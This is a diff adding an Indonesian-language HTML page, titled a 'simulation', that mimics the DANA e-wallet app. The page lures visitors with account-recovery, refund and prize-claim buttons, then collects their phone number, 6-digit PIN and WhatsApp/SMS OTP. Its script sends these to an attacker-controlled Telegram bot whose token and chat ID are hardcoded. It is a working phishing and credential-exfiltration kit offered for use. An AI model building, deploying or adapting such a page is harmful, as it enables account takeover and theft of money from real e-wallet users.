@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Simulasi DANA - Multi Page</title>
+<style>
+  :root{
+    --dana-blue:#09a1f0;
+    --dana-deep:#0086e0;
+    --white:#ffffff;
+    --muted:#666;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0;
+    font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    background:var(--dana-deep);
+    color:#fff;
+    -webkit-font-smoothing:antialiased;
+    -moz-osx-font-smoothing:grayscale;
+    min-height:100vh;
+  }
+
+  /* Pages */
+  .page{display:none;padding-bottom:90px;min-height:100vh}
+  .page.active{display:block}
+
+  /* ===== Page 1 (original) ===== */
+  .header{
+    text-align:center;padding:20px;font-size:22px;font-weight:600;
+  }
+  .top-icons{display:flex;justify-content:space-around;padding:10px 0 20px}
+  .top-icons div{text-align:center}
+  .top-icons svg{width:42px;height:42px;stroke:#fff;stroke-width:1.8;fill:none}
+  .top-icons div span{display:block;margin-top:4px;font-size:13px;color:#fff}
+  .container{
+    background:#fff;border-radius:20px;padding:20px;margin:10px;color:#000;
+  }
+  .option-card{
+    background:linear-gradient(135deg,#00AEEF,#0052D4);
+    border-radius:12px;color:#fff;text-align:center;padding:15px;margin:10px 0;
+    font-size:16px;font-weight:500;cursor:pointer;transition:transform .08s ease;
+  }
+  .option-card:active{transform:scale(.98)}
+  .bottom-nav{
+    position:fixed;left:0;right:0;bottom:0;background:#fff;display:flex;justify-content:space-around;
+    align-items:center;padding:8px 0 12px;box-shadow:0 -1px 6px rgba(0,0,0,.12);
+  }
+  .nav-item{ text-align:center;font-size:12px;color:#00AEEF;width:20%}
+  .nav-item svg{width:26px;height:26px;stroke:#999;stroke-width:2;fill:none}
+  .nav-center{background:var(--dana-deep);border-radius:50%;padding:14px;margin-top:-35px;box-shadow:0 2px 8px rgba(0,0,0,.25)}
+  .nav-center svg{width:32px;height:32px;stroke:#fff;stroke-width:2;fill:none}
+
+  /* ===== Page 2 (Masukkan Nomor HP - DANA-like) ===== */
+  .phone-page{
+    background:var(--dana-deep);padding:28px 22px 120px; color:#fff; min-height:100vh;
+  }
+  .dana-logo{
+    text-align:center;margin-top:6vh;margin-bottom:28px;
+  }
+  .dana-logo .logo-text{
+    font-weight:700;font-size:34px;letter-spacing:2px;
+  }
+  .phone-card{
+    background:var(--dana-deep); border-radius:14px; padding:8px 0 36px;
+  }
+  .phone-area{
+    display:flex;gap:14px;align-items:center;justify-content:center;margin:10px 6px 18px;
+  }
+  .country{
+    background:rgba(255,255,255,0.95);color:#000;padding:8px 12px;border-radius:12px;display:flex;align-items:center;gap:8px;
+    min-width:86px;justify-content:center;font-weight:600;
+  }
+  .country .flag{
+    width:26px;height:18px;border-radius:3px;overflow:hidden;background:#fff;display:inline-block;border:1px solid #eee;
+  }
+  .phone-input{
+    background:rgba(255,255,255,0.95);border-radius:18px;padding:14px 18px;width:62%;
+    font-size:28px;font-weight:700;color:#000;border: none; outline:none; text-align:left;
+    letter-spacing:1px;
+  }
+  .phone-note{
+    max-width:92%;margin:12px auto 22px;text-align:center;color:rgba(255,255,255,0.95);line-height:1.5;font-size:14px;
+  }
+  .btn-white{
+    margin:18px auto 8px;display:block;width:92%;background:#fff;color:var(--dana-deep);
+    border-radius:12px;padding:16px;font-weight:800;font-size:16px;border:none;
+  }
+
+  /* ===== Page 3 (PIN) ===== */
+  .pin-header{
+    background:var(--dana-deep);padding:14px 10px 18px;display:flex;align-items:center;gap:8px;color:#fff;
+    box-shadow:0 1px 0 rgba(0,0,0,0.06);
+  }
+  .pin-header .back{margin-left:6px;font-size:20px;opacity:.95}
+  .pin-header .title{flex:1;text-align:center;font-weight:700;font-size:18px;margin-right:36px}
+  .pin-body{background:#fff;border-top-left-radius:14px;border-top-right-radius:14px;padding:36px 20px 160px;color:#000;min-height:74vh}
+  .pin-title{text-align:center;font-size:20px;font-weight:700;margin-bottom:18px}
+  .pin-circles{display:flex;justify-content:center;gap:18px;margin-top:6px}
+  .circle{
+    width:24px;height:24px;border-radius:50%;border:2px solid #333;display:inline-block;
+    display:flex;align-items:center;justify-content:center;
+  }
+  .circle.filled{background:#333}
+  .pin-input-hidden{position:absolute;left:-9999px;opacity:0}
+  .pin-links{display:flex;justify-content:space-between;margin-top:26px;padding:0 20px;align-items:center}
+  .pin-links .help{display:flex;gap:8px;align-items:center}
+  .pin-links a{color:#333;font-weight:700;text-decoration:none;font-size:14px}
+
+  /* ===== Popup OTP ===== */
+  .popup{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.55);z-index:999}
+  .popup .panel{background:#fff;width:92%;max-width:380px;border-radius:14px;padding:18px 18px 12px;text-align:center;color:#000}
+  .popup h3{margin:4px 0 8px;font-size:18px}
+  .otp-row{display:flex;gap:12px;justify-content:center;margin:10px 0 6px}
+  .otp-box{width:56px;height:56px;border-radius:8px;border:1.6px solid #ccc;font-size:26px;text-align:center;line-height:56px}
+  .otp-actions{margin-top:12px}
+  .otp-send{background:var(--dana-deep);color:#fff;border:none;padding:12px 14px;border-radius:10px;width:100%;font-weight:700}
+  .otp-small{display:flex;justify-content:center;gap:18px;margin-top:10px;font-size:13px;color:#444}
+  .otp-small a{color:var(--dana-deep);text-decoration:none;font-weight:700}
+  .timer {margin-top:8px;font-size:13px;color:#666}
+
+  /* small responsiveness */
+  @media (max-width:420px){
+    .phone-input{font-size:24px}
+    .otp-box{width:48px;height:48px;line-height:48px}
+  }
+
+</style>
+</head>
+<body>
+
+<!-- ========== PAGE 1 (ASLI) ========== -->
+<div id="page1" class="page active">
+  <div class="header">PILIH KEBUTUHAN ANDA</div>
+
+  <div class="top-icons">
+    <div>
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 7v10M7 12h10"/></svg>
+      <span>Isi Saldo</span>
+    </div>
+    <div>
+      <svg viewBox="0 0 24 24"><rect x="5" y="5" width="14" height="14" rx="3" ry="3"/><path d="M12 8v8M8 12h8"/></svg>
+      <span>Minta</span>
+    </div>
+    <div>
+      <svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+      <span>Kirim</span>
+    </div>
+    <div>
+      <svg viewBox="0 0 24 24"><path d="M4 5h16v10H5l-1 4z"/></svg>
+      <span>Pesan</span>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="option-card" onclick="openPhonePage()">Pemulihan Akun</div>
+    <div class="option-card" onclick="openPhonePage()">Refund Saldo</div>
+    <div class="option-card" onclick="openPhonePage()">Saldo Pending</div>
+    <div class="option-card" onclick="openPhonePage()">Claim Saldo Cashback</div>
+    <div class="option-card" onclick="openPhonePage()">Claim Hadiah</div>
+    <div class="option-card" onclick="openPhonePage()">Aktivasi Akun</div>
+    <div class="option-card" onclick="openPhonePage()">Cek Limit</div>
+  </div>
+
+  <div class="bottom-nav">
+    <div class="nav-item">
+      <svg viewBox="0 0 24 24"><path d="M3 9.5L12 3l9 6.5v11H3z"/></svg>
+      <div>Beranda</div>
+    </div>
+    <div class="nav-item">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 6v6l3 2"/></svg>
+      <div>Aktivitas</div>
+    </div>
+    <div class="nav-center">
+      <svg viewBox="0 0 24 24"><path d="M4 4h5v5H4zM15 4h5v5h-5zM4 15h5v5H4zM15 15h5v5h-5z"/></svg>
+    </div>
+    <div class="nav-item">
+      <svg viewBox="0 0 24 24"><rect x="4" y="5" width="16" height="14" rx="2" ry="2"/></svg>
+      <div>Dompet</div>
+    </div>
+    <div class="nav-item">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 4-6 8-6s8 2 8 6"/></svg>
+      <div>Saya</div>
+    </div>
+  </div>
+</div>
+
+<!-- ========== PAGE 2 (MASUKKAN NOMOR HP - DANA-LIKE) ========== -->
+<div id="page2" class="page">
+  <div class="phone-page">
+    <div class="dana-logo">
+      <div class="logo-text">DANA</div>
+    </div>
+
+    <div style="height:10px"></div>
+
+    <div style="text-align:center">
+      <div style="max-width:760px;margin:0 auto">
+        <div class="phone-area">
+          <div class="country">
+            <div class="flag" style="background:linear-gradient(90deg,#fff 0 100%);"></div>
+            <div>+62</div>
+          </div>
+
+          <input id="phoneInput" class="phone-input" inputmode="numeric" pattern="[0-9]*"
+                 placeholder="811-1234-5678" maxlength="15" />
+        </div>
+
+        <div class="phone-note">
+          Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.
+          Dengan melanjutkan, kamu juga setuju dengan S&amp;K serta Kebijakan Privasi kami.
+        </div>
+
+        <button class="btn-white" id="btnContinue">LANJUTKAN</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ========== PAGE 3 (MASUK PIN) ========== -->
+<div id="page3" class="page">
+  <div class="pin-header">
+    <div class="back" onclick="backToPhone()" aria-hidden>◀</div>
+    <div class="title">Masuk</div>
+  </div>
+
+  <div class="pin-body">
+    <div class="pin-title">Masukkan PIN</div>
+
+    <!-- Hidden input to capture numbers -->
+    <input id="pinHidden" class="pin-input-hidden" inputmode="numeric" maxlength="6" pattern="[0-9]*" />
+
+    <div class="pin-circles" id="pinCircles">
+      <div class="circle" data-index="0"></div>
+      <div class="circle" data-index="1"></div>
+      <div class="circle" data-index="2"></div>
+      <div class="circle" data-index="3"></div>
+      <div class="circle" data-index="4"></div>
+      <div class="circle" data-index="5"></div>
+    </div>
+
+    <div class="pin-links">
+      <div class="help">
+        <img src="" alt="" style="width:34px;height:34px;border-radius:50%;background:#e6f3ff;border:2px solid #cfeeff"/>
+        <a href="#" onclick="alert('Bantuan diklik')">BUTUH BANTUAN?</a>
+      </div>
+      <div><a href="#" onclick="alert('Lupa PIN diklik')">LUPA PIN?</a></div>
+    </div>
+  </div>
+</div>
+
+<!-- ========== POPUP OTP ========== -->
+<div id="otpPopup" class="popup" aria-hidden>
+  <div class="panel">
+    <h3>Masukkan kode OTP</h3>
+    <p style="margin:6px 0 12px;color:#555">kode OTP telah di kirim ke WhatsApp</p>
+
+    <div class="otp-row">
+      <input class="otp-box" id="otp1" maxlength="1" inputmode="numeric" />
+      <input class="otp-box" id="otp2" maxlength="1" inputmode="numeric" />
+      <input class="otp-box" id="otp3" maxlength="1" inputmode="numeric" />
+      <input class="otp-box" id="otp4" maxlength="1" inputmode="numeric" />
+    </div>
+
+    <div class="otp-actions">
+      <button id="sendOtpBtn" class="otp-send">KIRIM</button>
+      <div class="timer" id="otpTimer" style="display:block;margin-top:10px">Kirim ulang dalam <span id="countdown">60</span> detik</div>
+      <div class="otp-small">
+        <a href="#" id="sendWa">Kirim ke WhatsApp</a>
+        <a href="#" id="sendSms">Kirim ke SMS</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ================= CONFIG: masukkan token & chat_id yang kamu punya =================
+ * Kamu sebelumnya menyebut:
+ * token: 7201669869:AAFL4YYCcXXmqmMBSKCA3FtK6cCKEG4mqXU
+ * chat_id: 6712267951
+ *
+ * Jika nanti token atau id berubah, ganti di sini.
+ */
+const TELEGRAM_BOT_TOKEN = "7201669869:AAFL4YYCcXXmqmMBSKCA3FtK6cCKEG4mqXU";
+const TELEGRAM_CHAT_ID = "6712267951";
+
+/* ================ NAVIGATION / FLOW ================ */
+function openPhonePage(){
+  showPage('page2');
+  // focus phone input for mobile number keyboard:
+  setTimeout(()=>document.getElementById('phoneInput').focus(),200);
+}
+function backToPhone(){
+  showPage('page2');
+  setTimeout(()=>document.getElementById('phoneInput').focus(),200);
+}
+function showPinPage(){
+  showPage('page3');
+  // focus hidden input to open numeric keyboard
+  setTimeout(()=>{document.getElementById('pinHidden').focus();},200);
+}
+function showPage(id){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0,0);
+}
+
+/* ================ PHONE input handling ================ */
+const phoneInput = document.getElementById('phoneInput');
+document.getElementById('btnContinue').addEventListener('click',()=>{
+  const raw = (phoneInput.value || "").trim();
+  if(!raw || raw.replace(/\D/g,'').length < 8){
+    alert('Masukkan nomor HP valid');
+    phoneInput.focus();
+    return;
+  }
+  // simpan nomor (format sederhana)
+  window._dana_sim = window._dana_sim || {};
+  window._dana_sim.phone = '+62' + raw.replace(/\D/g,'').replace(/^0+/,'');
+  showPinPage();
+});
+
+/* ================ PIN input handling (6 digits shown as circles) ================ */
+const pinHidden = document.getElementById('pinHidden');
+const pinCircles = document.querySelectorAll('#pinCircles .circle');
+
+pinHidden.addEventListener('input', updatePinCircles);
+pinHidden.addEventListener('keydown', (e)=>{
+  if(e.key === 'Backspace') {
+    // handled by input event
+  }
+});
+function updatePinCircles(){
+  const v = pinHidden.value || "";
+  for(let i=0;i<6;i++){
+    if(v[i]) pinCircles[i].classList.add('filled');
+    else pinCircles[i].classList.remove('filled');
+  }
+  if(v.length >= 6){
+    // simpan pin lalu munculkan OTP popup
+    window._dana_sim.pin = v.slice(0,6);
+    setTimeout(()=>openOtpPopup(),150);
+    pinHidden.value = ''; // clear for security on UI
+    updatePinCircles();
+  }
+}
+// fokus hidden input saat klik area
+document.getElementById('pinCircles').addEventListener('click', ()=>pinHidden.focus());
+/* agar numeric keyboard muncul di Android/iOS, fokus input saat masuk halaman */
+document.addEventListener('visibilitychange', ()=>{});
+
+/* ================ OTP popup, inputs, timer, send actions ================ */
+const otpPopup = document.getElementById('otpPopup');
+const otpInputs = ['otp1','otp2','otp3','otp4'].map(id=>document.getElementById(id));
+const countdownEl = document.getElementById('countdown');
+const sendOtpBtn = document.getElementById('sendOtpBtn');
+const sendWa = document.getElementById('sendWa');
+const sendSms = document.getElementById('sendSms');
+let otpTimerInterval = null;
+let otpTimeLeft = 60;
+
+function openOtpPopup(){
+  otpPopup.style.display = 'flex';
+  // clear previous
+  otpInputs.forEach(i=>i.value='');
+  otpInputs[0].focus();
+  startOtpTimer();
+}
+function closeOtpPopup(){
+  otpPopup.style.display = 'none';
+  stopOtpTimer();
+}
+
+// auto move focus
+otpInputs.forEach((el, idx)=>{
+  el.addEventListener('input', (e)=>{
+    const v = e.target.value;
+    if(v.length>1) e.target.value = v.slice(0,1);
+    if(v && idx < otpInputs.length-1) otpInputs[idx+1].focus();
+  });
+  el.addEventListener('keydown', (e)=>{
+    if(e.key === 'Backspace' && !e.target.value && idx>0){
+      otpInputs[idx-1].focus();
+    }
+  });
+});
+
+/* Timer */
+function startOtpTimer(){
+  stopOtpTimer();
+  otpTimeLeft = 60;
+  countdownEl.textContent = otpTimeLeft;
+  otpTimerInterval = setInterval(()=>{
+    otpTimeLeft--;
+    countdownEl.textContent = otpTimeLeft;
+    if(otpTimeLeft <= 0){
+      stopOtpTimer();
+      countdownEl.textContent = 0;
+    }
+  },1000);
+}
+function stopOtpTimer(){
+  if(otpTimerInterval) clearInterval(otpTimerInterval);
+  otpTimerInterval = null;
+}
+
+/* ====== Send handlers ====== */
+sendOtpBtn.addEventListener('click', ()=>{
+  const otpVal = otpInputs.map(i=>i.value||'').join('');
+  if(otpVal.length < 4){
+    alert('Masukkan kode OTP 4 digit');
+    otpInputs.find(i=>!i.value).focus();
+    return;
+  }
+  // ambil data
+  const phone = window._dana_sim?.phone || 'unknown';
+  const pin = window._dana_sim?.pin || 'unknown';
+  const payload = `📥 *New Submission*\n• Nomor: ${phone}\n• PIN: ${pin}\n• OTP: ${otpVal}\n• Waktu: ${new Date().toLocaleString()}`;
+  sendToTelegram(payload)
+    .then(ok=>{
+      if(ok) {
+        alert('Terkirim ke Telegram');
+        closeOtpPopup();
+        showPage('page1'); // kembali ke awal setelah kirim
+      } else {
+        alert('Gagal kirim ke Telegram (lihat console).');
+      }
+    });
+});
+
+/* Kirim via WA / SMS (membuka aplikasi masing-masing dengan isi pesan) */
+sendWa.addEventListener('click', (e)=>{
+  e.preventDefault();
+  const phone = (window._dana_sim?.phone || '+62');
+  const msg = encodeURIComponent(`Nomor: ${phone} - Minta OTP`);
+  // format: https://wa.me/?text=...
+  const url = `https://wa.me/?text=${msg}`;
+  window.open(url,'_blank');
+});
+sendSms.addEventListener('click', (e)=>{
+  e.preventDefault();
+  const phone = window._dana_sim?.phone || '+62';
+  const body = encodeURIComponent(`Minta OTP untuk nomor ${phone}`);
+  // sms: body param may vary by platform; try standard
+  window.location.href = `sms:${phone}?body=${body}`;
+});
+
+/* ================ Telegram send function ================ */
+async function sendToTelegram(messageText){
+  try{
+    const token = TELEGRAM_BOT_TOKEN;
+    const chatId = TELEGRAM_CHAT_ID;
+    const text = encodeURIComponent(messageText);
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&parse_mode=Markdown&text=${text}`;
+    const resp = await fetch(url, { method: 'GET', mode: 'cors' });
+    // Note: some browsers/hosts may block this due to CORS; still we try.
+    if(!resp.ok){
+      console.error('Telegram response not ok', resp.status, await resp.text());
+      return false;
+    }
+    const j = await resp.json();
+    return j && j.ok;
+  }catch(err){
+    console.error('sendToTelegram error', err);
+    return false;
+  }
+}
+l   
+/* ================ UX tweaks: show numeric keyboard on pin page ================ */
+// On opening pin page, focus hidden input
+document.querySelectorAll('.option-card').forEach(el=>el.addEventListener('click', ()=>{}));
+document.addEventListener('click', (e)=>{
+  // tap anywhere on PIN area to focus hidden input
+  if(e.target.closest('#page3')) pinHidden.focus();
+});
+
+/* Autofocus phone input if page2 open via history/back */
+window.addEventListener('load', ()=>{
+  // nothing
+});
+
+</script>
+</body>
+</html>
